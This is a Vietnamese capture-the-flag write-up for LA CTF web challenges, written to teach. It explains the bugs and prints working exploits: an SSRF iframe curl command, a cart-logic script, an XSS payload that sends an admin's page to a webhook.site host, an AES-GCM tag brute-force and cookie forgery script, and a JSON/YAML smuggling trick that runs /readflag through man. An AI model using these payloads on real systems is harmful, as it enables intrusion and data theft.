---
title: LA CTF

---

# LA CTF
![](https://hackmd.io/_uploads/ryI3SZ_DZe.png)
## Table content 
![platform.lac.tf_challs](https://hackmd.io/_uploads/H1fki-Ov-x.jpg)



## the-trial

- Slider có range 0 - 456975 (= 26^4 - 1), tức là cover toàn bộ tổ hợp 4 ký tự

- Giá trị slider được chuyển đổi thành chuỗi 4 ký tự thông qua cipher map "kjzhcyprdolnbgusfiawtqmxev"

- Khi nhấn Submit, nó `POST` đến endpoint `/getflag` với parameter word= (KHÔNG phải answer=)

- Nút "`I'm Feeling Lucky`" chỉ rickroll (redirect YouTube)

=> Mặc dù slider encode từ qua cipher, server nhận chuỗi 4 ký tự đã được hiển thị trên giao diện. Vậy ta chỉ cần gửi trực tiếp từ `flag`

![image](https://hackmd.io/_uploads/rkUygGdwbe.png)

**Flag: lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}**
## mutation mutation
![image](https://hackmd.io/_uploads/ryEpNcdD-x.png)

- Ta tìm cách vào Inspect của chall 
![image](https://hackmd.io/_uploads/rJtuSquP-g.png)

- Sẽ thấy một list dài như trong ảnh và nó spam liên tục
- Flag là một trong những flag được spam đó
- Để có thể xem, ta dùng lệnh `debugger;` trên Console của chall 
 ![image](https://hackmd.io/_uploads/SkwnH5uv-e.png)

- Ta tìm được flag thật

**Flag: lactf{с0nѕtаnt_mutаtі0n_1s_fun!_🧬_👋🏽_ІlІ1| ض픋ԡೇ∑ᦞ୞땾᥉༂↗ۑீ᤼യ⌃±❣Ӣ◼ௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌ}**


## lactf-invoice-generator
- Biến name có thể htmli được 
![image](https://hackmd.io/_uploads/Hko6czOw-x.png)

- Lợi dụng điều này ta có chain như sau 
    - Puppeteer render iframe → Chrome fetch `http://flag:8081/flag` từ internal network → nội dung flag hiển thị trong PDF trả về
- Dùng payload sau để lấy được flag ở local
![image](https://hackmd.io/_uploads/r1Mb3fOvbg.png)

```code=
curl -X POST http://<target>:3000/generate-invoice \
  -d "name=<iframe src='http://flag:8081/flag' width='800' height='500'></iframe>" \
  -d "item=test" \
  -d "cost=1" \
  -d "datePurchased=2026-01-01" \
  -o flag.pdf

```
![image](https://hackmd.io/_uploads/SJrznMuvWx.png)
**flag: lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}**
## narnes-and-bobles
### Phân tích
- Logic tính tiền `/cart/add`: server tính tổng tiền dựa trên `is_sample`
![image](https://hackmd.io/_uploads/HyKkP5ODZg.png)
- Nếu gửi `is_sample: 1` thì server coi đây là hàng mẫu (hàng mẫu thì miễn phí) và có thể thêm vào giỏ dù không đủ tiền
- Server sử dụng helper của `bun:sql` để insert
![image](https://hackmd.io/_uploads/ByPvP9OP-l.png)
- Chỉ nhìn vào keys của object đầu tiên trong mảng để xác định danh sách cột
- Checkout `/cart/checkout` : server trả về file thật hay file sample dựa vào dữ liệu đọc từ db
![image](https://hackmd.io/_uploads/H1-iDcODWx.png)

- Nếu `item.is_sample` trong db là `0` hoặc `null` thì ta sẽ lấy được file gốc chứa flag 

### Full script exploit
```python!
import requests
import zipfile
import io
import random
import string

# URL Challenge
TARGET_URL = "https://narnes-and-bobles.chall.lac.tf" 
FLAG_BOOK_ID = "2a16e349fb9045fa"
DUMMY_BOOK_ID = "a3e33c2505a19d18"

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

s = requests.Session()

# 1. Register & Login
username = generate_random_string()
password = generate_random_string()
print(f"[+] User: {username}:{password}")
s.post(f"{TARGET_URL}/register", json={"username": username, "password": password})
s.post(f"{TARGET_URL}/login", json={"username": username, "password": password})

# 2. Exploit: Heterogeneous Array Injection
print("[!] Sending exploit payload...")
payload = {
    "products": [
        { "book_id": DUMMY_BOOK_ID },          # Obj 1: No is_sample -> Defines SQL schema
        { "book_id": FLAG_BOOK_ID, "is_sample": 1 } # Obj 2: Bypass JS price check
    ]
}
res = s.post(f"{TARGET_URL}/cart/add", json=payload)
print(f"[+] Cart Balance: {res.json().get('remainingBalance')}") 
# Nếu balance giảm ít (ví dụ 990), nghĩa là Flag (1 triệu $) đã được tính giá 0 đồng.

# 3. Checkout & Extract Flag
print("[*] Checkout...")
res = s.post(f"{TARGET_URL}/cart/checkout")
try:
    with zipfile.ZipFile(io.BytesIO(res.content)) as z:
        if "flag.txt" in z.namelist():
            flag = z.read("flag.txt").decode('utf-8').strip()
            print(f"\n[SUCCESS] FLAG: {flag}\n")
        else:
            print("[-] flag.txt not found.")
except Exception as e:
    print(f"[-] Error: {e}")
```


## blogler
- Untrusted data rơi thẳng vào path -> path traversal
![image](https://hackmd.io/_uploads/HJoXX7uwZx.png)
- Dùng `_/flag` để qua được `validate_conf` sau đó nhờ `display_name` để chuyển lại thành `/flag`
Payload
```code=
user: &a
  name: _/flag
  password: tung
  title: hey
blogs:
- *a
```
![image](https://hackmd.io/_uploads/H19qQX_P-e.png)

**flag : lactf{7m_g0nn4_bl0g_y0u}**
## job-board
![image](https://hackmd.io/_uploads/BJmyq9dvZe.png)
![image](https://hackmd.io/_uploads/S1NlccdwZg.png)

- XSS: 
![image](https://hackmd.io/_uploads/B1i4ccODbe.png)
    - hàm `replace` với tham số string chỉ thay thế ký tự đầu tiên tìm thấy, không thay thế toàn bộ
    - Nếu ta nhập `<<` thì hàm sẽ chỉ đổi dấu `<` đầu tiên thành `&lt;`, dấu `<` thứ hai còn nguyên => chèn HTML
    
- IDOR 
![image](https://hackmd.io/_uploads/SJcgj5_w-l.png)
    - Chỉ lọc job dựa vào session 
    - endpoint `/job/:id` không check quyền 
    - Nếu tìm được UUID của job Flag Haver thì ta có thể truy cập trực tiếp để xem nội dung mà không cần login quyền admin
    
### Chain
- tạo một application chứa XSS
- gửi link apply cho Admin Bot
- khi admin xem mã JS sẽ thực thi trên trình duyệt của Admin
- Mã JS sẽ fetch trang chủ (`/`) bằng session của admin => trang chủ sẽ hiển thị link của private job
- gửi nội dung trang chủ (hoặc ID đã parse được) về server của webhook
- có ID từ webhook thì truy cập trực tiếp để lấy flag
### Exploit
- Bypass bộ lọc `replace` 
    - XSS: `<<img src=x onerror=...//>>`
    - JS payload: `fetch('/').then(r=>r.text()).then(t=>{
    location='https://webhook/...?flag='+btoa(t)
})`

- Script để lấy link private job
```python!
import requests
import re
import base64
import urllib.parse
import sys
sys.stdout.reconfigure(encoding='utf-8')

MY_WEBHOOK = "https://webhook.site/1bb91135-818c-4f43-9814-b7eaf3f8ec74" 
# ==============================================================================

BASE_URL = "https://job-board.chall.lac.tf"

# Payload XSS:
# 1. Dùng backticks (`) để tránh bị filter dấu ' hoặc "
# 2. Dùng << và >> để bypass lỗi replace() chỉ thay thế ký tự đầu tiên
# 3. Payload: Fetch trang chủ (/) -> Lấy nội dung -> Gửi về Webhook
xss_payload = f"<<img src=x onerror=fetch(`/`).then(r=>r.text()).then(t=>fetch(`{MY_WEBHOOK}?loot=`+btoa(t)))//>>"

def generate_exploit_link():
    if "YOUR-UUID-HERE" in MY_WEBHOOK:
        print("[-] LỖI: Bạn chưa thay đổi MY_WEBHOOK! Hãy sửa lại trong code.")
        return

    s = requests.Session()
    
    # 1. Lấy một Public Job ID bất kỳ để nộp đơn
    print(f"[+] Đang lấy Job ID...")
    try:
        r = s.get(BASE_URL + "/")
        public_job_id = re.search(r'href="/job/([a-f0-9\-]+)"', r.text)
        if not public_job_id:
            print("[-] Không tìm thấy Job nào. Server có thể đang lỗi.")
            return
        public_job_id = public_job_id.group(1)
    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")
        return

    # 2. Gửi đơn ứng tuyển chứa payload
    print(f"[+] Đang nộp đơn với Payload XSS...")
    r = s.post(f"{BASE_URL}/application/{public_job_id}", data={
        "name": "Hacker",
        "email": "hacker@example.com",
        "why": xss_payload 
    })
    
    # 3. Trích xuất Link Exploit
    app_match = re.search(r'href="/application/([a-f0-9\-]+)"', r.text)
    if not app_match:
        print("[-] Lỗi: Không lấy được Application ID. Payload có thể bị chặn.")
        return

    exploit_url = f"{BASE_URL}/application/{app_match.group(1)}"
    
    print("\n" + "="*60)
    print(f"[!] LINK ĐỘC HẠI ĐÃ TẠO THÀNH CÔNG:")
    print(f"{exploit_url}")
    print("="*60)
    print("\n[HƯỚNG DẪN TIẾP THEO]")
    print("1. Copy link trên.")
    print("2. Mở trình duyệt, truy cập: https://admin-bot.lac.tf/job-board")
    print("3. Dán link vào ô URL, giải Captcha và bấm Submit.")
    print("4. Quay lại Webhook Site của bạn và chờ Flag gửi về.")

if __name__ == "__main__":
    generate_exploit_link()
```

- Chạy script trên rồi lấy `exploit_url`
- Vào trang Admin Bot rồi submit URL đó
- Check webhook
![image](https://hackmd.io/_uploads/r1c66q_D-e.png)
- Decode đoạn base64
![image](https://hackmd.io/_uploads/r1HJR9_Dbe.png)
- Tìm thấy UUID của Flag Haver 
- Truy cập tới `https://job-board.chall.lac.tf/UUID` 
![image](https://hackmd.io/_uploads/SyoWAqdDbg.png)

**Flag: lactf{c0ngr4ts_0n_y0ur_n3w_l7fe}**
## single-trust
![image](https://hackmd.io/_uploads/rJiO0q_vZx.png)

- Session management sử dụng AES-256-GCM để mã hoá object `user`
```javascript!
function makeAuth(req, res, next) {
    // ...
    const user = { tmpfile };
    const data = JSON.stringify(user);
    const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
    // Format Cookie: iv.authTag.ct
    res.cookie("auth", [iv, authTag, ct].map((x) => x.toString("base64")).join("."));
    // ...
}

function needsAuth(req, res, next) {
    // ...
    const [iv, authTag, ct] = auth.split(".").map((x) => Buffer.from(x, "base64"));
    const cipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
    cipher.setAuthTag(authTag);
    // Decrypt và Parse JSON
    res.locals.user = JSON.parse(Buffer.concat([cipher.update(ct), cipher.final()]).toString("utf8"));
    // ...
}
```

- Ở endpoint `/` ![image](https://hackmd.io/_uploads/SkBeWouvWl.png)
    - Đọc file từ đường dẫn trong JSON user.tmpfile

- the patch & the trap
    - theo author nói thì fix lỗi từ chall zero-trust
        - Old:  `JSON.parse(cipher.update(ct).toString("utf8"));` không check auth tag => dễ bit-flipping
        - New: `Buffer.concat([cipher.update(ct), cipher.final()])` có gọi `.final()` để verify auth tag

- trong `Dockerfile` ta thấy ubuntu 20.04 cài đặt bản node.js cũ => tồn tại lỗ hổng Authentication Tag bị cắt ngắn

### Exploit chain
- lấy cookie hợp lệ từ server (`iv.tag.ct`)
- Forge ciphertext:
    - tính XOR difference giữa chuỗi gốc `/tmp/pastestore/` và chuỗi target `/flag.txt","a":"` thêm key `"a"` để đảm bảo JSON hợp lệ sau khi sửa
    - dùng diff này vào ciphertext tại vị trí offset 12

- Bypass Auth: thay thế Auth tag gốc (16 bytes) bằng tag giả mạo chỉ có 1 byte

- bruteforce 1 byte tag (0x00 - 0xFF). Do server dùng thư viện lỗi, nó chỉ so sánh 1 byte đầu tiên -> xác suất trúng 100% trong 256 requests

### Full script:
```python!
import requests
import base64
import sys
from urllib.parse import unquote, quote

# URL Target
TARGET_URL = "https://single-trust.chall.lac.tf"

# Hàm XOR 2 chuỗi bytes
def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

# Hàm decode Base64 an toàn (fix lỗi thiếu padding)
def safe_b64decode(s):
    s = unquote(s)
    s += "=" * ((4 - len(s) % 4) % 4)
    return base64.b64decode(s)

# Hàm encode Base64 trả về string
def safe_b64encode(b):
    return base64.b64encode(b).decode()

def solve():
    print(f"[+] Targeting: {TARGET_URL}")
    
    # 1. Lấy Cookie hợp lệ ban đầu
    s = requests.Session()
    try:
        s.get(TARGET_URL)
    except:
        print("[-] Server down?")
        return

    if 'auth' not in s.cookies:
        print("[-] Không lấy được cookie.")
        return

    # Parse Cookie (Format: IV.Tag.Ciphertext)
    auth_cookie = unquote(s.cookies['auth'])
    parts = auth_cookie.split('.')
    
    iv = safe_b64decode(parts[0])
    # Tag gốc (không dùng đến, vì ta sẽ fake nó)
    tag = safe_b64decode(parts[1]) 
    ct = safe_b64decode(parts[2])

    print(f"[+] Got Cookie. CT Len: {len(ct)}")

    # 2. Chuẩn bị Bit-Flipping
    # Offset của value trong JSON `{"tmpfile":"...` là 12 bytes
    offset = 12 
    
    # Chuỗi gốc (16 bytes)
    original_str = b"/tmp/pastestore/"
    
    # Chuỗi mục tiêu (16 bytes) - Tạo key rác "a" để giữ JSON valid
    target_str   = b'/flag.txt","a":"' 
    
    # Tính XOR Mask
    xor_mask = xor_bytes(original_str, target_str)
    
    # Tạo Ciphertext giả mạo
    ct_prefix = ct[:offset]
    ct_target = ct[offset : offset + 16] # Lấy đúng 16 bytes để XOR
    ct_suffix = ct[offset + 16:]
    
    ct_modified_segment = xor_bytes(ct_target, xor_mask)
    new_ct = ct_prefix + ct_modified_segment + ct_suffix
    
    # Encode lại các thành phần
    new_ct_b64 = safe_b64encode(new_ct)
    iv_b64 = safe_b64encode(iv)

    print("[+] Ciphertext modified. Starting Brute-force Tag (0x00-0xFF)...")

    # 3. Brute-force Auth Tag (1 Byte)
    for i in range(256):
        # Tạo tag giả 1 byte
        fake_tag = bytes([i])
        fake_tag_b64 = safe_b64encode(fake_tag)
        
        # Ghép cookie: iv.fake_tag.new_ct
        raw_cookie = f"{iv_b64}.{fake_tag_b64}.{new_ct_b64}"
        
        # URL Encode (Quan trọng: vì base64 có thể chứa dấu +)
        encoded_cookie = quote(raw_cookie)
        
        headers = {
            "Cookie": f"auth={encoded_cookie}"
        }
        
        # In tiến trình trên 1 dòng
        sys.stdout.write(f"\r[*] Trying byte: 0x{i:02x}")
        sys.stdout.flush()

        try:
            r = requests.get(TARGET_URL, headers=headers, timeout=5)
            
            # Kiểm tra flag trong response
            if "lactf{" in r.text:
                print(f"\n\n[SUCCESS] TAG ACCEPTED: 0x{i:02x}")
                print("=" * 50)
                # Lọc lấy flag từ HTML
                start = r.text.find("lactf{")
                end = r.text.find("}", start) + 1
                print("FLAG:", r.text[start:end])
                print("=" * 50)
                return
        except Exception as e:
            continue

    print("\n[-] Exploit failed.")

if __name__ == "__main__":
    solve()
```

**Flag: lactf{4pl3tc4tion_s3curi7y}**

## glotq
![image](https://hackmd.io/_uploads/ByBJYadP-x.png)

**middleware.go**
- kiểm tra request dựa trên `Content-type`
- Nếu `Content-type: application./yaml` nó sẽ dùng `yaml.Unmarshal` để parse body
- whitelist check:
    - kiểm tra `command` có nằm trong map cho phép không
    - nếu `command == "man"`, nó sẽ kiểm tra `args` (chỉ cho phép 1 argument là `jq`, `yq` hoặc `xq`)
    - nếu `command == "jq"`, nó sẽ không kiểm tra `args`

**handlers.go**
- endpoint `/json` được map vào hàm `JSONHandler`
- hàm này luôn dùng `json.Unmarshal` để parse body bất kể `Content-type` là gì 
- Sau đó gọi `exec.Command` với `command` và `args` đã parse được


### Vuln
**Go struct tags**
![image](https://hackmd.io/_uploads/BJgZq6OD-x.png)
- Go `json` package khớp field không phân biệt hoa thường nếu không tìm thấy khớp chính xác 
- `COMMAND`, `Command`, `coMMand` đều map vào field `Command` của struct

**yaml parser**
- `yaml.v3` thường phân biệt hoa thường với các tag. `COMMAND` sẽ không khớp với tag `yaml:"command"`

### JSON smuggling
- Ta có thể gửi một request `/json` với header `Content-Type: application/yaml`
- payload: `{"command": "jq", "COMMAND": "man", ...}`
- middleware (yaml):
    - nhìn thấy `command: "jq"`
    - bỏ qua `COMMAND`
    - check whitelist: `jq` được phép
    - check args: `jq`  không bị check args 
    => PASS ✅

- Handler (JSON)
    - nhìn thấy `command: "jq"`
    - nhìn thấy `COMMAND: "man"`. Do tính overwrite thì `man` sẽ đè lên `jq`
    - thực thi `man` với các arguments bất kỳ

### Exploit
- Ta phải đọc flag ở binary `/readflag` (SUID root) và ta cần phải chạy `/readflag`. Ta đã bypass được middleware để chạy `man` với tham số bất kỳ

- Tôi thử `man -P /readflag jq` thì fail, `man` phát hiện stdout không phải là TTY nên không kích hoạt pager
- thử với `man -H /readflag jq` thì trả về lỗi `no browser configured`, `man` cần biết browser cụ thể
- `man --html-browser=/readflag -Thtml jq`
    - `-Thtml` ép `man` format output dạng HTML
    - Khi output là HTML `man` phải tìm browser để hiển trị 
    - `--html-browser=/readflag` chỉ định `/readflag` là browser
    - Flow: `man` render HTML => gọi `/readflag /tmp/man-page.html` => `/readflag` chạy => in flag ra stdout 
 ![image](https://hackmd.io/_uploads/rJyqp6dwZx.png)

 
 
 
## clawcha
- Lỗ hỏng cookie-parser `j:` prefix injection 
```code=
app.use((req, res, next) => {
  if (typeof req.signedCookies.username === 'string') {
    if (users.has(req.signedCookies.username)) {
      res.locals.user = users.get(req.signedCookies.username);
    }
  }
  next();
});
```
- cookie-parser hoạt động như thế nào :
    - Khi server set cookie với `res.cookie(name, value, { signed: true })`, Express + cookie-parser xử lý qua 2 layer encoding:
        - Layer 1 - Signing (Express): Thêm prefix s: + HMAC signature
        - Layer 2 - JSON encoding (cookie-parser): Nếu value không phải string (object, number, boolean), cookie-parser tự thêm prefix `j:` + JSON.stringify:
- Khi server đọc cookie lại
    - Thấy prefix `s:` → verify HMAC signature → bỏ prefix, lấy raw value
    - Thấy prefix `j:` → JSON.parse(phần còn lại) → trả về kết quả
    - Không có prefix `j:` → trả về string nguyên gốc 

![image](https://hackmd.io/_uploads/r1HHTa_vWl.png)

- Giờ sẽ login với `{"username": "j:  \"r2uwu2\"", "password": "anything"}`
![image](https://hackmd.io/_uploads/BJLOpa_D-l.png)

- Đây là `cookie` sau khi `login` 
![image](https://hackmd.io/_uploads/rk0oTT_wZg.png)

- Sau đó `POST` lên `claw` để lấy `flag` 
![image](https://hackmd.io/_uploads/HJAFTpdPbx.png)

**flag: lactf{m4yb3_th3_r34l_g4ch4_w4s_l7f3}**

## bobles-and-narnes

- Line 139:  `is_sample=1` → bị filter ra → không tính tiền flag     ✅ bypass giá
![image](https://hackmd.io/_uploads/HkZhLzOPWx.png)

- Line 149:  `spread {...prod}` giữ nguyên is_sample=1 trong object & `db(cartEntries)` chỉ đọc keys object đầu → `drop is_sample`  ✅ lỗ hổng Bun SQL
![image](https://hackmd.io/_uploads/ryxRIf_P-e.png)


- Line 170:  `is_sample=NULL` → falsy → serve flag.txt bản full       ✅ lấy flag
![image](https://hackmd.io/_uploads/B1sPtzdwbl.png)

- Ok exploit thôi
![image](https://hackmd.io/_uploads/SkaiuGOPZg.png)

- Sau đó ta checkout để lấy flag 
![image](https://hackmd.io/_uploads/BybeOzOP-l.png)

**flag: lactf{hojicha_chocolate_dubai_labubu}**

 
 
ĐƯỢC VIẾT LẠI BỞI : **p1c0L0** AND **R4f3al0w**